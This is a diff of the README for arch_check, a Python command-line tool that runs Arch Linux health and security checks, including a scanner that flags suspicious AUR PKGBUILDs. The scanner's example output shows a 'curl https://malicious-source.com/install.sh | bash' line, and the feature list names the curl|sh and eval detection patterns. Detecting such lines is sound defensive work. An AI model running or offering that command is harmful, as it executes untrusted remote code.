@@ -1,82 +1,101 @@
 # arch_check
-**Arch Linux Health & Disk Origin CLI**  
-*One-command system health check and disk ancestry for Arch Linux, with zero dependencies.*
-# arch_check
-**Arch Linux Health & Disk Origin CLI**  
-*One-command system health and disk ancestry for Arch Linux, with zero Python package dependencies (relies on system binaries).*
+
+**Arch Linux System Health & Security CLI**  
+*Comprehensive system health, AUR security scanning, and disk ancestry for Arch Linux.*
 
 ---
 
 ## Overview
 
-**arch_check** is a fast, no-dependency CLI tool for Arch Linux that checks your system health, disk usage, and device ancestry in a single command. It helps you quickly spot issues with disks, kernel, services, orphaned packages, and more—making system maintenance and troubleshooting effortless. Built with pure Python standard library, it glues together essential system commands and presents results in a clear, colorized format.
+**arch_check** is a comprehensive CLI tool for Arch Linux that performs system health checks, security audits, and disk ancestry tracking. It offers three run modes for flexibility:
+
+- **Quick mode** (`-q`): Fast health snapshot in seconds, no root required
+- **Full audit** (`-a`): Complete system check including slow and security checks
+- **Security mode** (`--security`): Security-focused checks only (ports, logins, rootkits)
+
+Built with pure Python standard library (zero external dependencies), it glues together system utilities and presents results in a clear, colorized format with optional JSON output.
 
 **Problem Solved:**
-Tired of running multiple commands to check disk usage, origins (LVM, LUKS, btrfs), kernel mismatches, or orphaned packages? arch_check gives you a single, readable summary—ideal for both daily checks and troubleshooting.
+From basic disk usage to AUR package security scanning—arch_check consolidates 20+ system checks into one tool. Ideal for daily health snapshots, pre-update audits, or security reviews.
+
+---
+
+## Run Modes
+
+```sh
+arch-check -q               Quick health snapshot (seconds)
+arch-check -a               Full audit (slower, some need root)
+arch-check --security       Security-focused checks only
+arch-check -q --security    Quick + security checks
+arch-check -a --no-rkhunter Full audit, skip rkhunter
+arch-check -j -q            Quick audit as JSON
+```
 
 ---
 
 ## Key Features
 
-- **Disk Usage & Origin:** Shows usage, free space, filesystem, and device ancestry for all major mounts (supports ext4, btrfs, LVM, LUKS). Skips virtual and temporary filesystems for clarity.
-- **Temperature Sensors:** Reports all available temperature sensors and warns if any are high.
+### Core System Checks
+- **Disk Usage & Origin:** Shows usage, free space, filesystem, and device ancestry for all major mounts (supports ext4, btrfs, LVM, LUKS). Skips virtual and temporary filesystems.
+- **Temperature Sensors:** Reports all available temperature sensors and warns if any exceed thresholds.
 - **SMART Disk Health:** Summarizes SMART status for all disks (if supported).
-- **Kernel Version Check:** Detects mismatches between running and installed kernel.
-- **Config File Alerts:** Finds unmerged `.pacnew` and `.pacsave` config files.
+- **Kernel Version Check:** Detects mismatches between running and installed kernel (reboot required).
+- **Config File Alerts:** Finds unmerged `.pacnew` and `.pacsave` config files with age analysis.
 - **Failed Services:** Lists failed systemd services.
 - **Orphaned Packages:** Detects unused dependency packages.
-- **Pacman Statistics:** Summarizes package counts and cache size.
-- **Colorized Output:** Auto-detects terminal and supports `--color`/`--no-color`.
-- **JSON Output:** Machine-readable output for scripting.
+- **Pacman Statistics:** Summarizes package counts (native vs AUR) and cache size.
+
+### Quick System Metrics
+- **timedatectl:** NTP synchronization status, timezone verification
+- **load-avg:** System load average vs CPU count (warns at 75%/100%)
+- **inotify:** Inotify watch limit usage monitoring
+- **checkupdates:** Pending package updates display (informational)
+- **timers:** Systemd timer status, detects never-run or missed timers
+- **boot-blame:** Boot timing analysis (slowest units, total boot time)
+- **arch-audit:** AUR package vulnerability scanning (CVEs)
+
+### AUR Security Scanning
+- **aur-integrity:** Verify AUR package file integrity with `pacman -Qk`
+- **aur-paths:** Detect files installed outside standard paths
+- **aur-suid:** Find setuid/setgid files (with whitelist)
+- **aur-pkgbuild:** Scan PKGBUILDs for suspicious patterns (curl|sh, eval, etc.)
+
+### Slow Checks (Full Audit Only)
+- **journal:** System journal errors (last 24h), grouped by unit
+- **dmesg:** Kernel ring buffer errors (hardware, I/O, OOM)
+
+### Security Checks
+- **ports:** Listening TCP/UDP ports, detects unexpected/externally reachable services
+- **failed-logins:** Failed login attempt analysis (brute-force detection)
+- **rkhunter:** Rootkit scanner integration (requires rkhunter)
+
+### Output Features
+- **Colorized Output:** Auto-detects terminal, supports `--color`/`--no-color`
+- **JSON Output:** Machine-readable output for scripting (`-j`)
 
 ---
 
 ## Skipped Filesystems
 
-To keep the output focused and relevant, arch_check automatically skips virtual, temporary, and special-purpose filesystems when reporting disk usage and origins. These filesystems do not represent persistent storage or user data and are typically used by the kernel or system processes.
+To keep output focused, arch_check skips virtual, temporary, and special-purpose filesystems:
 
-**Skipped filesystems include:**
-- swap
-- tmpfs
-- devtmpfs
-- proc
-- sysfs
-- cgroup
-- mqueue
-- hugetlbfs
-- fusectl
-- configfs
-- securityfs
-- pstore
-- efivarfs
-- debugfs
-- tracefs
-- ramfs
-- overlay
-- squashfs
-- autofs
-- binfmt_misc
-- bpf
-- nsfs
-
-**Why skip them?**
-These filesystems are either virtual (`tmpfs` and `proc`), used for system internals, or provide temporary storage. They do not contain persistent user data and are not useful for health or origin checks. By skipping them, `arch_check` keeps the output clean and focused on real disks and partitions that matter for system health and maintenance.
+**Skipped:** swap, tmpfs, devtmpfs, proc, sysfs, cgroup, mqueue, hugetlbfs, fusectl, configfs, securityfs, pstore, efivarfs, debugfs, tracefs, ramfs, overlay, squashfs, autofs, binfmt_misc, bpf, nsfs
 
 ---
 
 ## Prerequisites & Dependencies
 
-## Prerequisites & Dependencies
-
 - **Python:** 3.8 or newer
 - **Arch Linux:** Required for full features
-- **System packages:**
-  - `btrfs-progs` (for btrfs usage/subvolume info)
-  - `lm_sensors` (for temperature)
-  - `smartmontools` (for SMART)
-  - `systemd`, `pacman` (runtime utilities)
+- **System packages (optional, for full features):**
+  - `btrfs-progs` (btrfs usage/subvolume info)
+  - `lm_sensors` (temperature sensors)
+  - `smartmontools` (SMART disk health)
+  - `pacman-contrib` (checkupdates command)
+  - `arch-audit` (AUR vulnerability scanning)
+  - `rkhunter` (rootkit scanning)
 
-Note: Some checks (for example `smartctl`, `btrfs subvolume show`, or reading `/var/cache/pacman/pkg`) may require root privileges to return full information; run the script with `sudo` when necessary.
+**Note:** Some checks require root privileges for full information (SMART, inotify usage, failed logins, rkhunter). Run with `sudo` when needed.
 
 ---
 
@@ -99,204 +118,204 @@ This installs the CLI as `/usr/bin/arch_check`.
 
 ### Quick Start
 
-Available switches :
-
 ```sh
-  -h, --help             show this help message and exit
-  -l, --logo             Print the Arch logo and hardware summary [--no-logo to suppress]
-  --sensors              Show all available temperature sensors and warn if high [--no-sensors to suppress]
-  -k, --kernel           Check for kernel/running version mismatch [--no-kernel to suppress]
-  -p, --pacnew           Scan for unmerged .pacnew config files [--no-pacnew to suppress]
-  -s, --services         List failed systemd services [--no-services to suppress]
-  -o, --orphans          List orphaned packages (unused dependencies) [--no-orphans to suppress]
-  -d, --disk             Show usage, filesystem type, and LVM/LUKS origin [--no-disk to suppress]
-  -t, --stats            Show pacman package statistics (Native vs AUR) [--no-stats to suppress]
-  --smart                Show SMART disk health summary (if supported) [--no-smart to suppress]
-  -a, --all              Perform all health checks and show logo
-  -j, --json             Output all results in JSON format for further processing
-  --log-level LOG_LEVEL  Set log level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
-  --color                Enable colored output (default if terminal)
-  --no-color             Disable colored output (default if piped)
-  
-When using `--json`, the script runs checks with `as_dict=True` where supported and includes per-section `status` and `issues` fields for easy programmatic parsing.
+arch-check -q              # Quick health snapshot
+arch-check -a              # Full system audit
+arch-check --security      # Security checks only
+sudo arch-check -a         # Full audit with root privileges
+```
 
+### Available Flags
+
+```
+Run Modes:
+  -q, --quick            Run quick health checks only (seconds, no root needed)
+  -a, --all              Run all health checks (quick + slow + security)
+  --security             Run security-focused checks only
+
+Core Checks:
+  -l, --logo             Print Arch logo and hardware summary
+  --sensors              Temperature sensors
+  -k, --kernel           Kernel version mismatch check
+  -p, --pacnew           Config file alerts (.pacnew/.pacsave)
+  -s, --services         Failed systemd services
+  -o, --orphans          Orphaned packages
+  -d, --disk             Disk usage and origin
+  -t, --stats            Pacman statistics
+  --smart                SMART disk health
+
+Quick Checks:
+  --timedatectl          NTP sync and timezone status
+  --load-avg             System load vs CPU count
+  --inotify              Inotify watch limit usage
+  --checkupdates         Pending updates display
+  --timers               Systemd timer status
+  --boot-blame           Boot timing analysis
+  --arch-audit           AUR vulnerability scanning
+
+AUR Security:
+  --aur-integrity        AUR package file integrity
+  --aur-paths            Non-standard install paths
+  --aur-suid             Setuid/setgid file detection
+  --aur-pkgbuild         PKGBUILD security scanning
+
+Slow Checks:
+  --journal              Journal errors (24h)
+  --dmesg                Kernel errors
+
+Security:
+  --ports                Listening ports analysis
+  --failed-logins        Failed login attempts
+  --rkhunter             Rootkit scanner (slow)
+
+Output:
+  -j, --json             JSON output for scripting
+  --color / --no-color   Force color/no-color
 ```
 
 ---
 
-## Switches & Examples
+## Examples
 
-Each switch can be combined or used alone, most of them have a --no-SWITCH equivalent to switch off , useful to run -a,--all and leave a few off. 
-Here are the main options, with real output examples:
-
-### `-d`, `--disk`  
-**Show disk usage, filesystem, device, and origin.**
+### `-d`, `--disk` - Disk Usage & Origin
 
 **Example (ext4, LVM, LUKS):**
 ```
 Mount           : Usage    : Free       : FS       : Type       : Device                 : Origin                               : Subvol
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-/               :   32.0% :    127G GB : ext4     : 1.0        : /dev/volume-root       : nvme0n1.nvme0n1p2.cryptlvm.volume-root : 
-/boot           :   28.0% :    370M GB : vfat     : FAT32      : /dev/nvme0n1p1         : nvme0n1.nvme0n1p1                    : 
-/home           :   41.0% :    909G GB : ext4     : 1.0        : /dev/volume-home       : nvme0n1.nvme0n1p2.cryptlvm.volume-home : 
+/               :   32.0% :    127G GB : ext4     : 1.0        : /dev/volume-root       : nvme0n1.nvme0n1p2.cryptlvm.volume-root :
+/boot           :   28.0% :    370M GB : vfat     : FAT32      : /dev/nvme0n1p1         : nvme0n1.nvme0n1p1                    :
+/home           :   41.0% :    909G GB : ext4     : 1.0        : /dev/volume-home       : nvme0n1.nvme0n1p2.cryptlvm.volume-home :
 ```
 
-**Example (btrfs, subvolumes):**
-```
-Mount           : Usage    : Free       : FS       : Type       : Device                 : Origin                               : Subvol
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-/               :   56.5% :   63.77 GB : btrfs    : ?          : /dev/nvme0n1p2         : nvme0n1.nvme0n1p2                    : /@
-/.snapshots     :   56.5% :   63.77 GB : btrfs    : ?          : /dev/nvme0n1p2         : nvme0n1.nvme0n1p2                    : /@.snapshots
-/boot           :   75.0% :    133M GB : vfat     : FAT32      : /dev/nvme0n1p1         : nvme0n1.nvme0n1p1                    :
-/home           :   56.5% :   63.77 GB : btrfs    : ?          : /dev/nvme0n1p2         : nvme0n1.nvme0n1p2                    : /@home
-/media/1tb      :   51.0% :    861G GB : ext4     : 1.0        : /dev/sda1              : sda.sda1                             :
-/media/1tb_2    :   51.0% :    859G GB : ext4     : 1.0        : /dev/sdb1              : sdb.sdb1                             :
-/var/cache/pacman/pkg :   56.5% :   63.77 GB : btrfs    : ?          : /dev/nvme0n1p2         : nvme0n1.nvme0n1p2                    : /@pkg
-/var/log        :   56.5% :   63.77 GB : btrfs    : ?          : /dev/nvme0n1p2         : nvme0n1.nvme0n1p2                    : /@log
-```
-
-(Numeric btrfs Usage/Free requires `btrfs-progs` and appropriate privileges — use `sudo` if the current user cannot run `btrfs` commands.)
-```
-
-### `--sensors`  
-**Show all available temperature sensors and warn if high.**
+### `--timedatectl` - Time & Date Sync
 
 **Example:**
 ```
-temp1:        +45.0°C
-temp1:        +54.0°C
-Core 0:        +43.0°C  (high = +105.0°C, crit = +105.0°C)
+========== Time & Date (timedatectl) ==========
+Timezone: America/New_York
+NTP Service: active
+Synchronized: yes
+Local Time: 2024-01-15 14:32:45
 ```
 
-### `--smart`  
-**Show SMART disk health summary (if supported).**
-
-**Example:**
-```
-/dev/nvme0n1: SMART not available or permission denied.
-/dev/sdb: SMART not available or permission denied.
-```
-
-### `-k`, `--kernel`  
-**Check for kernel/running version mismatch.**
+### `--load-avg` - System Load
 
 **Example:**
 ```
-Component    : Installed    : Running
-─────────────────────────────────────────────
-Major        : 6            == 6
-Minor        : 18           == 18
-Patch        : 2            != 1
-Arch Rel     : arch2        != arch1
-Kernel check failed.
+========== System Load Average ==========
+CPU Count: 8
+Load Average (1/5/15 min): 0.45 / 0.52 / 0.48
+Threshold (15-min): 8
 ```
 
-### `-p`, `--pacnew`  
-**Scan for unmerged .pacnew config files.**
+### `--aur-integrity` - AUR Package Integrity
 
 **Example:**
 ```
-========== Config Files (.pacnew) ==========
-  -> /etc/pacman.conf.pacnew
-  -> /etc/makepkg.conf.pacnew
-  -> /etc/makepkg.conf.d/fortran.conf.pacnew
-  -> /etc/pulse/default.pa.pacnew
-  -> /etc/pulse/default.pa.pacsave
+========== AUR Package Integrity ==========
+Warning: 1 package(s) with integrity issues:
+
+google-chrome
+  Modified files: 2
+    - /opt/google/chrome/MEIPreload/preflight
+    ... and 1 more
 ```
 
-### `-s`, `--services`  
-**List failed systemd services.**
-
-**Example:**
-```
-	-> docker-compose@jellifyn.service
-```
-
-### `-o`, `--orphans`  
-**List orphaned packages (unused dependencies).**
+### `--ports` - Listening Ports
 
 **Example:**
 ```
-Orphans: argon2, asciidoc, bridge-utils, ...
+========== Listening Ports ==========
+PROTO : ADDRESS          : PORT  : PROCESS           : MANAGED
+───────────────────────────────────────────────────────────────────
+tcp   : 127.0.0.1        : 3306  : mysqld            : yes
+tcp   : 0.0.0.0          : 80    : nginx             : yes
 ```
 
-### `-t`, `--stats`  
-**Show pacman package statistics (Native vs AUR).**
+### `-p`, `--pacnew` - Config Files with Age
 
 **Example:**
 ```
-Total Packages     : 1876
-	┗━ Native        : 1788
-	┗━ Foreign/AUR   : 88
-Explicitly Sourced : 432
-As Dependencies    : 1444
-Pacman Cache Size  : 50G
+========== Config Files (.pacnew/.pacsave) ==========
+  -> /etc/pacman.conf.pacnew (2 days old)
+  -> /etc/pulse/default.pa.pacnew (45 days old)
+  -> /etc/ssh/sshd_config.pacnew (120 days old)
 ```
 
-### `-a`, `--all`  
-**Run all checks and show summary.**
+### `--aur-pkgbuild` - PKGBUILD Security Scanning with Safe Pattern Exclusions
+
+**Recent Update:** Added intelligent exclusion filters for known safe patterns to reduce false positives.
+
+**Example Output:**
+```
+========== AUR PKGBUILD Security Scan ==========
+
+Suspicious patterns detected:
+
+malicious-package (from yay cache)
+  Patterns: curl_pipe_shell, eval_subshell
+  Line 45: curl https://malicious-source.com/install.sh | bash
+    [FLAGGED]
+  Excluded (known safe patterns):
+    Line 23: python -c "import site; print(site.getsitepackages())"
+      → standard idiom to locate site-packages install path
+    Line 28: pip install --no-deps ./wheel-file.whl
+      → used in -bin packages to install pre-built wheel without remote dependencies
+
+Summary: 1542 scanned, 12 not cached (manual review), 3 flagged
+```
+
+**Safe Pattern Exclusions (Auto-Whitelisted):**
+
+The PKGBUILD scanner now recognizes these common safe patterns and excludes them from flagging:
+
+1. **`python -c "import site..."`** — Standard idiom to locate site-packages directory, present in hundreds of legitimate PKGBUILDs
+2. **`python -c "import sys..."`** — Used to check Python version or sys.path at build time
+3. **`python -c "from distutils..."`** — Legacy distutils path/version lookup, common in older PKGBUILDs
+4. **`pip install --no-deps`** — Used in -bin packages to install local pre-built wheels without pulling remote dependencies
+
+**Auditable Output:** Whitelisted lines are shown with explanatory reasons in the human output and included in JSON for audit trails.
+
+---
+
+## JSON Output
+
+When using `-j`, arch_check returns structured output with per-section status and issues:
+
+```json
+{
+  "disk": {
+    "mounts": [...],
+    "status": "ok",
+    "issues": 0
+  },
+  "aur_integrity": {
+    "status": "attention",
+    "issues": 1,
+    "packages_checked": 15,
+    "packages_with_issues": [...]
+  },
+  "summary": {
+    "issues": 2,
+    "issues_by_section": {
+      "disk": 0,
+      "aur_integrity": 1,
+      "ports": 1
+    },
+    "status": "attention"
+  }
+}
+```
 
 ---
 
 ## Contributing
 
-Found a bug or want to add a feature? Please open an issue or submit a pull request on the [GitHub repository](https://github.com/kidpixo/arch_check). For major changes, open an issue first to discuss what you’d like to change.
+Found a bug or want to add a feature? Please open an issue or submit a pull request on the [GitHub repository](https://github.com/kidpixo/arch_check).
 
 ---
 
 ## License
 
 **0BSD** — Free for any use, no warranty.
-
-## Troubleshooting
-
-- No numeric btrfs usage shown for `-d`:
-  - Ensure `btrfs-progs` is installed: `sudo pacman -S btrfs-progs`.
-  - Try running `sudo btrfs filesystem df -b /` to inspect totals and used bytes for the filesystem.
-
-- SMART output is empty or permission denied:
-  - `smartctl` often requires root: run `sudo smartctl -H /dev/sdX` (replace `/dev/sdX` with your device).
-
-- `sensors` shows nothing:
-  - Install and configure `lm_sensors`, then run `sensors`. Run `sudo sensors-detect` if needed.
-
-- Pacman cache size or some package stats are missing:
-  - Reading `/var/cache/pacman/pkg` may require privileges; try `sudo du -sh /var/cache/pacman/pkg`.
-
-## JSON Output (short schema example)
-
-When using `--json`, `arch_check` returns a top-level object with keys for each enabled check and a `summary` object. Each section provides `status` and `issues` where applicable. Minimal example:
-
-```json
-{
-  "disk": {
-    "mounts": [
-      {
-        "mount": "/",
-        "usage_percent": 56.5,
-        "free_gb": 63.77,
-        "fstype": "btrfs",
-        "device": "/dev/nvme0n1p2",
-        "origin": "nvme0n1.nvme0n1p2",
-        "subvol": "/@",
-        "btrfs_device_size_bytes": 1717986918400,
-        "btrfs_used_bytes": 68719476736,
-        "btrfs_free_estimated_bytes": 1659268433152
-      }
-    ],
-    "status": "ok",
-    "issues": 0
-  },
-  "summary": {
-    "issues": 35,
-    "status": "attention"
-  }
-}
-```
-
-Notes:
-- `btrfs_device_size_bytes`: total device size (bytes) as reported by `btrfs filesystem usage -b` or summed allocation totals.
-- `btrfs_used_bytes`: used bytes on the filesystem.
-- `btrfs_free_estimated_bytes`: estimated free bytes when available (from `Free (estimated)`).
-
-For scripting, check the per-section `status` and `issues` fields to determine if work is required.
